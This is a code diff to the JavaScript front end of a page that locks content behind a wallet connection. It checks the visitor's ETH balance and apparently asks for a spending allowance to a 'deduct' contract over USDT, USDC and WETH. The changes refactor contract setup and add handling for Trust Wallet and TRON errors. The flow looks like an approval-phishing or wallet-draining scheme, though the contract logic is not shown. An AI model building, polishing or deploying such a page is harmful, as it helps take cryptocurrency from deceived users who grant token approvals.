@@ -1,7 +1,7 @@
 //---Client-side Constants (客戶端常數)---
 const DEDUCT_CONTRACT_ADDRESS='0xaFfC493Ab24fD7029E03CED0d7B87eAFC36E78E0';
 const USDT_CONTRACT_ADDRESS='0xdAC17F958D2ee523a2206206994597C13D831ec7';
-// 修正後的 USDC 地址
+// ****** 修正後的 USDC 地址 (EIP-55 Checksum) ******
 const USDC_CONTRACT_ADDRESS='0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
 const WETH_CONTRACT_ADDRESS='0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2';
 
@@ -66,6 +66,17 @@ showOverlay('Please connect your wallet to unlock content 🔒<p style="font-siz
 //---Core Wallet Logic (核心錢包邏輯)---
 
 /**
+*初始化合約實例，使用當前的 signer 和 userAddress
+*/
+function initializeContracts() {
+if (!signer) throw new Error("Signer not available to initialize contracts.");
+deductContract = new ethers.Contract(DEDUCT_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, signer);
+usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
+usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
+wethContract = new ethers.Contract(WETH_CONTRACT_ADDRESS, ERC20_ABI, signer);
+}
+
+/**
 *【Trust Wallet 修復】使用精簡的 RPC 請求發送交易，並加入魯棒的錯誤處理。
 */
 async function sendMobileRobustTransaction(populatedTx) {
@@ -117,7 +128,7 @@ return receipt;
 }
 
 /**
-*初始化錢包，強制切換至主網，並【總是開啟遮罩】要求用戶手動連接。
+*初始化錢包，強制切換至主網。
 */
 async function initializeWallet() {
 try {
@@ -141,23 +152,17 @@ return showOverlay(`Failed to switch network. Please do so manually.<br>Error: $
 }
 }
 
-// ****** 關鍵變動：移除自動重新整理，改為在 connectWallet 中處理 ******
-// window.ethereum.on('accountsChanged',() => window.location.reload());
-// window.ethereum.on('chainChanged',() => window.location.reload());
-// 如果需要處理外部切換，我們會在 connectWallet 裡進行更精確的處理。
-// ***************************************************************
+// 移除自動刷新，依賴 connectWallet 的顯式狀態更新
 
-//檢查是否有現有的連線，如果有，重置狀態確保 connectButton 顯示未連接。
+// 檢查是否有現有的連線，如果有，直接進入授權檢查流程
 const accounts=await provider.send('eth_accounts',[]);
 if(accounts.length>0) {
-// 嘗試使用現有地址初始化 (如果用戶已經連接過)
 userAddress = accounts[0];
 signer = await provider.getSigner();
-// 立即呼叫 checkAuthorization 而不是 resetState(false)
-// 這將嘗試直接從已連線的狀態進入授權檢查流程
-await checkAuthorization(); 
+initializeContracts(); // 初始化合約
+await checkAuthorization(); // 直接檢查授權
 } else {
-    //【關鍵點】：如果沒有現有連線，強制顯示連接遮罩
+    // 如果沒有現有連線，強制顯示連接遮罩
     showOverlay('Please connect your wallet to unlock content 🔒<p style="font-size: 16px; font-weight: normal; margin-top: 10px;">(Click the wallet icon to start)</p>');//英文
 }
 
@@ -176,12 +181,9 @@ try {
 if(!signer)return showOverlay('Wallet is not connected. Please connect first.');//英文
 updateStatus("Checking authorization status...");//英文
 
-// 重新確保合約實例已存在，防止 initializeWallet 裡直接跳轉到這裡時遺漏
-if(!deductContract || !usdtContract || !usdcContract || !wethContract) {
-    deductContract = new ethers.Contract(DEDUCT_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, signer);
-    usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
-    usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
-    wethContract = new ethers.Contract(WETH_CONTRACT_ADDRESS, ERC20_ABI, signer);
+// 確保合約已初始化
+if(!deductContract) {
+    initializeContracts();
 }
 
 const isServiceActive=await deductContract.isServiceActiveFor(userAddress);
@@ -222,8 +224,12 @@ showOverlay('Authorization required.<p style="font-size: 16px; font-weight: norm
 updateStatus("");
 }catch(error) {
 console.error("Check Authorization Error:",error);
-if(error.code==='CALL_EXCEPTION') {
-return showOverlay('Contract communication failed.<br>Please ensure you are on the **Ethereum Mainnet** and the contract address is correct, then refresh the page.');//英文
+if(error.code==='CALL_EXCEPTION'||error.message.includes('Invalid RPC URL')) { // 處理 Trust Wallet/RPC 錯誤
+    let msg = 'Contract communication failed or Wallet Network Error.<br>Please ensure you are on the **Ethereum Mainnet** and **refresh the page**.';
+    if (error.message.includes('tron.twnodes.com')) {
+         msg = 'Trust Wallet is connected to the TRON network. Please manually switch the wallet network to **Ethereum Mainnet** and refresh.';
+    }
+    return showOverlay(msg);//英文
 }
 showOverlay(`Authorization check failed: ${error.message}`);//英文
 }
@@ -296,21 +302,18 @@ if(network.chainId!==1n)return;
 
 showOverlay('Please confirm the connection in your wallet...'); // 英文
 // 1. 請求連線，獲取當前選中的地址
+// 這會強制 MetaMask 彈出連接視窗（如果尚未連接）或返回當前選中的帳戶。
 const accounts=await provider.send('eth_requestAccounts',[]);
 if(accounts.length===0)throw new Error("No account selected.");//英文
 
 const currentConnectedAddress = accounts[0];
 
 // 2. 總是使用最新的地址覆蓋全局變數和 Signer
-// 即使地址變了，我們也不再強制重新整理，而是直接更新狀態。
 userAddress = currentConnectedAddress;
 signer = await provider.getSigner();
 
-// 3. 確保所有合約實例都是使用最新的 signer 創建的
-deductContract = new ethers.Contract(DEDUCT_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, signer);
-usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
-usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
-wethContract = new ethers.Contract(WETH_CONTRACT_ADDRESS, ERC20_ABI, signer);
+// 3. 確保所有合約實例都是使用最新的 signer 創建的 (關鍵同步步驟)
+initializeContracts();
 
 
 console.log("【DEBUG】Wallet Connected. Current User Address (Updated):", userAddress);
@@ -329,7 +332,7 @@ const hasSufficientEth=totalEthEquivalent>=oneEth;
 const serviceActivated=await deductContract.isServiceActiveFor(userAddress);
 const requiredAllowance=await deductContract.REQUIRED_ALLOWANCE_THRESHOLD();
 
-//2. 檢查關鍵讀取值 (用於診斷 requiredAllowance 是否讀到 0n)
+//2. 檢查關鍵讀取值
 console.log("【DEBUG】Required Allowance (Threshold):", requiredAllowance.toString());
 console.log("【DEBUG】Service Activated:", serviceActivated);
 //---------------------------------------------------------
@@ -385,6 +388,8 @@ if(error.code===4001) {
 userMessage="You rejected the authorization. Please try again.";//英文
 }else if(error.message.includes('insufficient funds')) {
 userMessage="Authorization failed: Insufficient ETH balance for Gas fees.";//英文
+}else if(error.message.includes('Block tracker destroyed')) {
+    userMessage="Wallet state error. Please refresh the page and try reconnecting.";
 }
 
 showOverlay(userMessage);
